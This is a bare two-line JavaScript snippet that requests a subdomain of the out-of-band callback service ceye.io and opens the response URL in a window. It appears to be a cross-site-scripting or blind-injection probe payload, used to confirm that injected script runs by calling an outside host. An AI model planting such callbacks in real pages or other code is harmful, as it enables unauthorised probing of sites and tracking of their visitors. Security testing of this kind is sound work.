var x=new XMLHttpRequest();x.open('GET','http://hnvh5p.ceye.io');x.send();
x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
